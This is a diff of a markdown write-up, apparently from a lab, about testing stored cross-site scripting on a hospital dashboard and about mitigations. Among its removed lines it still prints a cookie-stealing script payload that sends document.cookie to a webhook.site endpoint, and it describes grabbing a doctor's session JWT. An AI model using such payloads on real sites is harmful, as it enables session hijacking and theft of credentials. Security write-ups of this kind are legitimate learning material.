@@ -8,8 +8,8 @@ I tested for **Stored Cross-Site Scripting (XSS)** on a custom hospital dashboar
 ##  Tools Used
 - XSS vulnerable site
 - JavaScript payloads
-- webhook.site (for capturing cookies, optional)
-- DevTools (Application tab)
+- webhook.site 
+- DevTools
 
 ---
 
@@ -26,8 +26,7 @@ I tested for **Stored Cross-Site Scripting (XSS)** on a custom hospital dashboar
 
 ### 2. Used Cookie Stealer
 
-<script>fetch("https://webhook.site/YOUR-ID?cookie=" + document.cookie)</script>
-This payload secretly sent the cookies of the doctor user to my webhook endpoint.
+Used a payload which secretly sent the cookies of the doctor user to my webhook endpoint.
 
 3. Checked DevTools → Application → Cookies
 Grabbed the session JWT from the browser
@@ -52,6 +51,3 @@ Encode HTML special chars before rendering
 
 ### 4.Enable SameSite + Secure Flags
 Prevents cross-origin and insecure transfers
-
-### 5.JWT Security
-Use strong signature algo (RS256), never trust user-controlled JWTs blindly
